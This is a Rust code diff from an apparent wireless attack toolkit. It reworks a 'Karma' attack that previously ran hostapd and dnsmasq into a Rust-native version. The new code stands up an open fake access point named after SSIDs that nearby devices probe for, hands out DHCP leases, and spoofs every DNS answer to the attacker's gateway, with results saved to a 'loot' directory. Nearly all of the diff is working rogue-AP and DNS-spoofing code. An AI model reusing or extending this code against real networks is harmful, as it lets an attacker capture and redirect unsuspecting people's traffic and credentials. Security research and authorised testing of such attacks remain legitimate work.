@@ -8,9 +8,8 @@
 use std::collections::HashMap;
 use std::fs;
 use std::io::Write;
-use std::net::IpAddr;
+use std::net::{IpAddr, Ipv4Addr};
 use std::path::PathBuf;
-use std::process::{Command, Stdio};
 use std::sync::{
     atomic::{AtomicBool, Ordering},
     Arc, Mutex,
@@ -20,6 +19,10 @@ use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
 use chrono::Local;
 use log::warn;
+use rustyjack_netlink::{
+    AccessPoint, ApConfig, ApSecurity, DhcpConfig, DhcpServer, DnsConfig, DnsRule, DnsServer,
+    HardwareMode,
+};
 
 use crate::capture::{CaptureFilter, PacketCapture};
 use crate::error::{Result, WirelessError};
@@ -30,7 +33,6 @@ use crate::netlink_helpers::{
     netlink_set_interface_up,
 };
 use crate::probe::ProbeSniffer;
-use crate::process_helpers::pkill_exact_force;
 
 fn arp_clients(interface: &str) -> Vec<String> {
     let mut clients = Vec::new();
@@ -57,6 +59,11 @@ fn arp_clients(interface: &str) -> Vec<String> {
         }
     }
     clients
+}
+
+struct DhcpRuntime {
+    handle: Option<thread::JoinHandle<()>>,
+    running: Arc<Mutex<bool>>,
 }
 
 /// Karma attack configuration
@@ -674,10 +681,10 @@ where
     })
 }
 
-/// Karma attack with hostapd - responds to specific SSIDs
+/// Karma attack with Rust-native AP - responds to specific SSIDs
 ///
 /// Unlike execute_karma which only sniffs probes, this variant actually
-/// creates fake APs for captured SSIDs using hostapd.
+/// creates fake APs for captured SSIDs using the Rust AP stack.
 pub fn execute_karma_with_ap<F>(
     config: KarmaConfig,
     ap_interface: &str,
@@ -716,7 +723,7 @@ where
         config.ssid_whitelist.clone()
     };
 
-    // We'll create hostapd config for the first target SSID
+    // We'll create AP config for the first target SSID
     let primary_ssid = target_ssids
         .first()
         .cloned()
@@ -733,74 +740,40 @@ where
 
     let _ = netlink_set_interface_up(ap_interface);
 
-    // Create hostapd config
-    let hostapd_conf_path = loot_dir.join("hostapd.conf");
-    let hostapd_config = format!(
-        "interface={}\n\
-        driver=nl80211\n\
-        ssid={}\n\
-        hw_mode=g\n\
-        channel={}\n\
-        wmm_enabled=0\n\
-        macaddr_acl=0\n\
-        auth_algs=1\n\
-        ignore_broadcast_ssid=0\n\
-        wpa=0\n",
-        ap_interface,
-        primary_ssid,
-        if config.channel == 0 {
-            6
-        } else {
-            config.channel
-        }
-    );
+    let gateway_ip = Ipv4Addr::new(192, 168, 4, 1);
+    let channel = if config.channel == 0 { 6 } else { config.channel };
 
-    fs::write(&hostapd_conf_path, &hostapd_config)
-        .map_err(|e| WirelessError::System(format!("Failed to write hostapd.conf: {}", e)))?;
-
-    // Start hostapd
-    let mut hostapd = Command::new("hostapd")
-        .arg(&hostapd_conf_path)
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .spawn()
-        .map_err(|e| WirelessError::System(format!("Failed to start hostapd: {}", e)))?;
-
-    // Start dnsmasq for DHCP
-    let dnsmasq_conf_path = loot_dir.join("dnsmasq.conf");
-    let dnsmasq_logging = if logging_enabled {
-        "        log-queries\n        log-dhcp\n"
-    } else {
-        ""
+    let ap_config = ApConfig {
+        interface: ap_interface.to_string(),
+        ssid: primary_ssid.clone(),
+        channel,
+        security: ApSecurity::Open,
+        hidden: false,
+        beacon_interval: 100,
+        max_clients: 0,
+        dtim_period: 2,
+        hw_mode: HardwareMode::G,
     };
-    let dnsmasq_config = format!(
-        "interface={}\n\
-        dhcp-range=192.168.4.10,192.168.4.100,255.255.255.0,12h\n\
-        dhcp-option=3,192.168.4.1\n\
-        dhcp-option=6,192.168.4.1\n\
-        server=8.8.8.8\n\
-{dnsmasq_logging}\
-        listen-address=192.168.4.1\n\
-        bind-interfaces\n\
-        address=/#/192.168.4.1\n",
-        ap_interface,
-        dnsmasq_logging = dnsmasq_logging
-    );
 
-    fs::write(&dnsmasq_conf_path, &dnsmasq_config)
-        .map_err(|e| WirelessError::System(format!("Failed to write dnsmasq.conf: {}", e)))?;
-
-    pkill_exact_force("dnsmasq").ok();
-
-    let mut dnsmasq = Command::new("dnsmasq")
-        .args(["-C", &dnsmasq_conf_path.to_string_lossy(), "-d"])
-        .stdout(Stdio::null())
-        .stderr(Stdio::null())
-        .spawn()
-        .map_err(|e| WirelessError::System(format!("Failed to start dnsmasq: {}", e)))?;
+    let mut ap = start_access_point(ap_config)?;
+    let mut dhcp = match start_dhcp_server(ap_interface, gateway_ip, logging_enabled) {
+        Ok(runtime) => runtime,
+        Err(e) => {
+            stop_ap_best_effort(&mut ap);
+            return Err(e);
+        }
+    };
+    let mut dns = match start_dns_server(ap_interface, gateway_ip, logging_enabled) {
+        Ok(server) => server,
+        Err(e) => {
+            stop_dhcp_runtime(&mut dhcp);
+            stop_ap_best_effort(&mut ap);
+            return Err(e);
+        }
+    };
 
     progress(&format!(
-        "Karma AP '{}' running on {}",
+        "Karma AP '{}' running on {} (Rust AP)",
         primary_ssid, ap_interface
     ));
 
@@ -821,13 +794,9 @@ where
     }
 
     // Cleanup
-    let _ = hostapd.kill();
-    let _ = hostapd.wait();
-    let _ = dnsmasq.kill();
-    let _ = dnsmasq.wait();
-
-    pkill_exact_force("hostapd").ok();
-    pkill_exact_force("dnsmasq").ok();
+    stop_dhcp_runtime(&mut dhcp);
+    let _ = dns.stop();
+    stop_ap_best_effort(&mut ap);
 
     // Reset interface
     let _ = netlink_flush_addresses(ap_interface);
@@ -854,6 +823,121 @@ where
         result,
         loot_path: loot_dir,
     })
+}
+
+fn stop_ap_best_effort(ap: &mut AccessPoint) {
+    if let Ok(handle) = tokio::runtime::Handle::try_current() {
+        let _ = handle.block_on(async { ap.stop().await });
+    } else if let Ok(rt) = tokio::runtime::Runtime::new() {
+        let _ = rt.block_on(async { ap.stop().await });
+    }
+}
+
+fn start_access_point(ap_config: ApConfig) -> Result<AccessPoint> {
+    let mut ap = AccessPoint::new(ap_config)
+        .map_err(|e| WirelessError::System(format!("Failed to create Access Point: {}", e)))?;
+
+    let start_result = tokio::runtime::Handle::try_current()
+        .map(|handle| {
+            handle.block_on(async {
+                ap.start()
+                    .await
+                    .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
+            })
+        })
+        .unwrap_or_else(|_| {
+            tokio::runtime::Runtime::new()
+                .map_err(|e| WirelessError::System(format!("Failed to create tokio runtime: {}", e)))
+                .and_then(|rt| {
+                    rt.block_on(async {
+                        ap.start()
+                            .await
+                            .map_err(|e| WirelessError::System(format!("AP start failed: {}", e)))
+                    })
+                })
+        });
+
+    if let Err(e) = start_result {
+        return Err(e);
+    }
+
+    thread::sleep(Duration::from_secs(2));
+    Ok(ap)
+}
+
+fn start_dhcp_server(
+    interface: &str,
+    gateway_ip: Ipv4Addr,
+    logging_enabled: bool,
+) -> Result<DhcpRuntime> {
+    let dhcp_cfg = DhcpConfig {
+        interface: interface.to_string(),
+        server_ip: gateway_ip,
+        subnet_mask: Ipv4Addr::new(255, 255, 255, 0),
+        range_start: Ipv4Addr::new(192, 168, 4, 10),
+        range_end: Ipv4Addr::new(192, 168, 4, 100),
+        router: Some(gateway_ip),
+        dns_servers: vec![gateway_ip],
+        lease_time_secs: 43200,
+        log_packets: logging_enabled,
+    };
+
+    let mut server = DhcpServer::new(dhcp_cfg.clone())
+        .map_err(|e| WirelessError::System(format!("Failed to create DHCP server: {}", e)))?;
+    let running_handle = server.running_handle();
+    server
+        .start()
+        .map_err(|e| WirelessError::System(format!("Failed to start DHCP server: {}", e)))?;
+    log::info!(
+        "DHCP server bound on {} offering {}-{}",
+        interface,
+        dhcp_cfg.range_start,
+        dhcp_cfg.range_end
+    );
+
+    let handle = thread::spawn(move || {
+        if let Err(e) = server.serve() {
+            log::error!("DHCP server exited with error: {}", e);
+        }
+    });
+
+    Ok(DhcpRuntime {
+        handle: Some(handle),
+        running: running_handle,
+    })
+}
+
+fn stop_dhcp_runtime(runtime: &mut DhcpRuntime) {
+    if let Ok(mut running) = runtime.running.lock() {
+        *running = false;
+    }
+    if let Some(handle) = runtime.handle.take() {
+        let _ = handle.join();
+    }
+}
+
+fn start_dns_server(
+    interface: &str,
+    gateway_ip: Ipv4Addr,
+    logging_enabled: bool,
+) -> Result<DnsServer> {
+    let dns_cfg = DnsConfig {
+        interface: interface.to_string(),
+        listen_ip: gateway_ip,
+        default_rule: DnsRule::WildcardSpoof(gateway_ip),
+        custom_rules: std::collections::HashMap::new(),
+        upstream_dns: None,
+        log_queries: logging_enabled,
+    };
+
+    let mut server = DnsServer::new(dns_cfg)
+        .map_err(|e| WirelessError::System(format!("Failed to create DNS server: {}", e)))?;
+    server
+        .start()
+        .map_err(|e| WirelessError::System(format!("Failed to start DNS server: {}", e)))?;
+    log::info!("DNS server bound on {} ({})", interface, gateway_ip);
+
+    Ok(server)
 }
 
 /// List of commonly probed SSIDs that are good Karma targets
